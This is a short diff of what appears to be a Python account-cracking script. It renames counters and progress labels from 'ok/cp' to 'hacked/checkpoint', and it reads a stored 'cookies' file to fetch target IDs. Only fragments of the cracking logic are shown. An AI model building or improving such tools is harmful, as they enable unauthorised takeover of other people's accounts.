@@ -66,11 +66,11 @@ def moch_yayan():
          global die,check,result, count
          id = []
          die = 0
-         cp = []
-         ok = []
+         chek = []
+         hack = []
          count = 0
-         cp = 0
-         ok = 0
+         check = 0
+         result = 0
          def masuk():
              try:
                     cek = open("cookies").read()
@@ -140,7 +140,7 @@ def moch_yayan():
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
